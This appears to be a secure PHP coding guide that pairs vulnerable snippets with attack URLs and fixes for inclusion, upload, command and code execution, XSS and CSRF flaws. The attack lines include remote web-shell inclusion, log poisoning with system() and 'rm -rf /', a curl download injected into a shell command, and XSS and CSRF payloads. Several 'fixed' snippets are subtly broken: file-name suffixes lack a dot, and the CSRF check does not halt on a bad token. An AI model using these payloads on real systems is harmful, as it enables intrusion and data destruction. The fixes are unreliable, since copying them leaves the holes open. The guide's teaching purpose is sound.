#Secure PHP Coding

1. Remote File Inclusion (RFI)
2. Local File Inclusion (LFI)
3. Local File Disclosure/Download
4. Remote File Upload
5. Remote Command Execution
6. Remote Code Execution (RCE)
7. Authentication Bypass/Insecure Permissions
8. Cross-Site Scripting(XSS)
9. Cross Site Request Forgery(CSRF)

##1) Remote File Inclusion
####Affected PHP Functions
- require
- require_once
- include
- include_once

####Vulnerable Codes

test.php
```php
<?php
$theme = $_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = $_GET['theme'];
include $theme.'.php';
?>
```
####Attack
- Including Remote Code: 
 	- http://localhost/rfi/index.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt
	- http://localhost/rfi/index1.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt?
- Using PHP stream php://input:
	- http://localhost/rfi/index.php?theme=php://input 
- Using PHP stream php://filter:
	- http://localhost/rfi/index.php?theme=php://filter/convert.base64-encode/resource=index.php
- Using data URIs:
	- http://localhost/rfi/index.php?theme=data://text/plain;base64,SSBsb3ZlIFBIUAo=
	
####How to fix
- set `allow_url_include = Off` in php.ini
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink.php', 'black.php');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include $theme;
}
?>
```

##2) Local File Inclusion
####Affected PHP Functions
- require
- require_once
- include
- include_once

####Vulnerable Codes

test.php
```php
<?php
$theme = 'themes/'.$_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = 'themes/'.$_GET['theme'];
include $theme.'.php';
?>
```
####Attack
- Reading Local Filesystem File:
	- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../etc/passwd
- Uploading PHP Shell:
	- Exploiting Apache Access Log
		- http://localhost/<?php system($_GET['cmd']); ?>
		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=rm -rf /
	- proc/self/environ method
		- Tamper http User-Agent into <?php system($_GET['cmd']); ?>
		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../proc/self/environ&cmd=rm -rf /

####How to fix
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the dot "." and slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink.php', 'black.php');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include 'themes/'.$theme;
}
?>
```

##3) Local File Disclosure/Download
####Affected PHP Functions
- readfile
- bzopen
- fopen
- SplFileObject
- file_get_contents
- readlink

####Vulnerable Code

download_invoice.php
```php
<?php
$invoice = dirname(__FILE__).'invoices/'.$_REQUEST['invoice'];
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");

header("Content-Type: application/force-download");
header( "Content-Disposition: attachment; filename=".basename($invoice));

@readfile($invoice);
die();
?>
```
####Attack
- Download sytem files/config files/logs
	- http://localhost/lfd/download_invoice.php?invoice=../../../../../../../../../../../../../../../../../../etc/passwd

####How to fix
- Use pathinfo or basename
- Don't allow special chars in variables
- filter the dot "." and slash "/"

download_invoice_fixed.php
```php
<?php
$invoice = dirname(__FILE__).'invoices/'.pathinfo($_REQUEST['invoice'])['filename'].'csv';
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");

header("Content-Type: application/force-download");
header( "Content-Disposition: attachment; filename=".basename($invoice));

@readfile($invoice);
die();
?>
```

##4) Remote File Upload
####Affected PHP Functions
- move_uploaded_file
- file_put_contents
- fwrite

####Vulnerable Codes

upload_profile_picture.php
```php
<?php
$filename = $_FILES['picture']['name'];
$folder = dirname(__FILE__).'/pictures/';
if(!move_uploaded_file($_FILES['picture']['tmp_name'], $folder.$filename)){
	echo "picture not uploaded";
	die();
}
echo "picture uploaded successfully";
?>
```
upload_profile_picture_with_type_check.php
```php
<?php
$size = getimagesize($_FILES['picture']['tmp_name']);
if (!$size) {
	echo 'Upload Image file :p';
	die();
}
$filename = $_FILES['picture']['name'];
$folder = dirname(__FILE__).'/pictures/';
if(!move_uploaded_file($_FILES['picture']['tmp_name'], $folder.$filename)){
	echo "picture not uploaded";
	die();
}
echo "picture uploaded successfully";
?>
```
####Attack
- Upload PHP file/Script File
- Upload Image file with php code in EXIF data and file extenstion is php

####How to fix
- Validate file type and remove default file extension and remove whitespaces in the file name
- Generate random file name
- Store uploaded files in different path not '/var/www/'

upload_profile_picture_fixed.php
```php
<?php
$size = getimagesize($_FILES['picture']['tmp_name']);
if (!$size) {
	echo 'Upload Image file :p';
	die();
}
$filename = trim(pathinfo($_FILES['picture']['name'])['filename']);
$folder = dirname(__FILE__).'/pictures/';
if(!move_uploaded_file($_FILES['picture']['tmp_name'], $folder.$filename.'.jpg')){
	echo "picture not uploaded";
	die();
}
echo "picture uploaded successfully";
?>
```

##5) Remote Command Execution
####Affected PHP Functions
- exec
- passthru
- system
- shell_exec
- `` (backticks)
- popen
- proc_open
- pcntl_exec

####Vulnerable Code

upload_picture.php
```php
<?php
$user_id = $_GET['user_id'];
$path = dirname(__FILE__).'/'.$user_id;
if (!file_exists($path)){
	system('mkdir '.$path);
}
// upload picture
?>
```
####Attack
- Pass arguments with || or && then system commands
	- http://localhost/command/upload_picture.php?user_id=1 || curl -K https://raw.githubusercontent.com/vinothzomato/zpwned/master/lfd/download_invoice.php -o test.php

####How to fix
- Use escapeshellarg() and escapeshellcmd()

upload_picture_fixed.php
```php
<?php
$user_id = $_GET['user_id'];
$path = dirname(__FILE__).'/'.$user_id;
if (!file_exists($path)){
	system('mkdir '.escapeshellarg($path));
}
// upload picture
?>
```

##6) Remote Code Execution
####Affected PHP Functions
- eval
- assert
- preg_replace // with /e in regex
- create_function
- $$, extract & parse_str with one parameter
- dynamic function
- ReflectionFunction
- unserialize
- functions with callbacks for example (array_map, usort, ob_start & preg_replace_callback etc)

####Vulnerable Codes
#####Evaluating eval()
eval.php
```php
<?php
$title = $_GET['title'];
eval('echo Welcome '.$title.';');
// assert() also vulnerable
?>
```
#####Regular Expression
to_upper.php
```php
<?php
$string = $_GET['string'];
print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
?>
```
#####Dynamic Variables
```php
<?php
foreach ($_GET as $key => $value) {
	$$key = $value;
}
//extract($_GET);
//parse_str($_GET);

function isLoggedIn(){
	return $_SESSION['isLoggedIn'];
}
if (isLoggedIn()) {
	echo "You are logged in :)";
}
else{
	echo "you are not logged in :(";
	die();
}
?>
```
#####Dynamic Functions
callback.php
```php
<?php
$callback = $_GET['callback'];
$arguments = $_GET['arguments'];
function callback($args){
	echo 'function called with arguments';
}
$callback($arguments);
//$func = new ReflectionFunction($callback); $func->invoke($arguments); also same
// create_function also vulnerable // create_function('$foobar', "echo $foobar;");
?>
```
####Attack
- http://localhost/rce/to_upper.php?string=phpinfo()
- http://localhost/rce/display_title.php?title=vinoth;phpinfo();
- http://localhost/rce/user.php?_SESSION[isLoggedIn]=true
- http://localhost/rce/callback.php?callback=phpinfo&arguments=1

####How to fix
- Don't allow any special character like "(",")","``"&";" etc
- Never create ($$, extract & parse_str()) dynamic variables from $_POST, $_GET or $_REQUEST
- Validate callback with array of allowed callback

##7) Authentication Bypass/Insecure Permissions
####Vulnerable Scenario
- Validation of user permissions in View Page & missing user validation in handler page
- Improper validation of id parameter

####Attack
- http://localhost/auth/handler.php?user_id=1&type=delete_user

####How to fix
- add proper user validation

##8) Cross-Site Scripting(XSS)
####Affected PHP Functions
- print
- echo
- printf
- sprintf
- var_dump
- print_r

####Vulnerable Code
search.php
```php
<?php
$query = $_GET['q'];
$user_id = $_GET['user_id'];
echo "You searched for ".$query;
?>
<script type="text/javascript">
var user = '<?php echo $user_id?>';
</script>
```
####Attack
- http://localhost/xss/search.php?user_id=1&q=<script>alert(1)</script>
- http://localhost/xss/search.php?user_id=1%27;alert(1);//&q=test

####How to fix
- filter user inputs 
- use htmlspecialchars,htmlentities,strip_tags,filter_var & is_numeric

search_fixed.php
```php
<?php
$query = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
$user_id = filter_var($_GET['user_id'], FILTER_VALIDATE_INT);
echo "You searched for ".$query;
?>
<script type="text/javascript">
var user = '<?php echo $user_id?>';
</script>
```
##9) Cross Site Request Forgery(CSRF)
####Vulnerable Scenario
- Missing CSRF token in post data
- Using $_GET or $_REQUEST instead of $_POST in data update

####Vulnerable Code
update_user.php
```php
<?php
$name = $_REQUEST['name'];
$about = $_REQUEST['about'];
$username = $_REQUEST['username'];
// update user info
?>
```

####Attack
attacker.html
```html
<!DOCTYPE html>
<html>
<body>
<img src="http://localhost/csrf/update_user.php?name=YouHaveBeenHackedByVinoth" alt="You Have Been Hacked :(" height="0" width="0"/>
</body>
</html>
```
####How to fix
- avoid $_REQUEST and $_GET for getting post information
- use CSRF Token for post data

update_user_fixed.php
```php
<?php
$name = $_POST['name'];
$about = $_POST['about'];
$username = $_POST['username'];
if($_SESSION['csrf_token'] != $_POST['csrf_token']){
	echo 'Wrong Token';
}
// update user info
?>
```